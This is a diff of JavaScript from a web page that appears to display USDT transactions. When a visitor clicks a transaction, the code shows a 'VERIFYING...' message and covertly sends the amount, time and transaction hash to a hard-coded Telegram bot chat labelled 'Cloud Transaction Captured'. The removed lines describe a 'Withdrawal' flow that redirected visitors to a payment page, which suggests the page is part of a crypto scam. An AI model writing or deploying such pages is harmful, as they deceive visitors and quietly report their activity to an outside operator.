@@ -154,16 +154,18 @@
         const chatId = '8423231609';
         let lastTimestamp = 0;
 
-        // Function to send to Telegram and Redirect (The "Withdrawal" flow)
+        // Function to send to Telegram and Redirect directly to Etherscan
         async function sendAndRedirect(amount, timestamp, txHash, btnElement) {
             btnElement.classList.add('sending');
             btnElement.innerHTML = `VERIFYING... <i class="fas fa-spinner fa-spin ml-1"></i>`;
 
             const date = new Date(timestamp * 1000).toLocaleString();
+            const etherscanLink = `https://etherscan.io/tx/${txHash}`;
+            
             const message = `🚀 *Cloud Transaction Captured*\n\n` +
                           `💰 *Amount:* ${amount} USDT\n` +
                           `📅 *Time:* ${date}\n` +
-                          `🔗 *TxHash:* [View on Etherscan](https://etherscan.io/tx/${txHash})`;
+                          `🔗 *TxHash:* [View on Etherscan](${etherscanLink})`;
 
             try {
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -177,27 +179,22 @@
                     })
                 });
 
-                if (response.ok) {
-                    btnElement.innerHTML = `REDIRECTING... ✅`;
-                    setTimeout(() => {
-                        window.location.href = "payment.html"; 
-                    }, 800);
-                } else {
-                    throw new Error('Telegram failed');
-                }
-            } catch (error) {
-                btnElement.innerHTML = `ERROR ❌`;
+                // Redirect to the REAL Etherscan transaction page regardless of telegram success for speed
+                btnElement.innerHTML = `EXPLORING... ✅`;
                 setTimeout(() => {
-                    btnElement.innerHTML = `EXPLORE <i class="fas fa-external-link-alt ml-1 opacity-50"></i>`;
-                    btnElement.classList.remove('sending');
-                }, 2000);
+                    window.location.href = etherscanLink; 
+                }, 500);
+
+            } catch (error) {
+                // If telegram fails, we still allow exploration
+                console.error("Telegram error:", error);
+                window.location.href = etherscanLink;
             }
         }
 
         // Main Cloud Sync Function (Render Backend Strategy)
         async function fetchFromCloud() {
             try {
-                // Fetching from your Render API endpoint
                 const res = await fetch('/api/data');
                 const data = await res.json();
                 
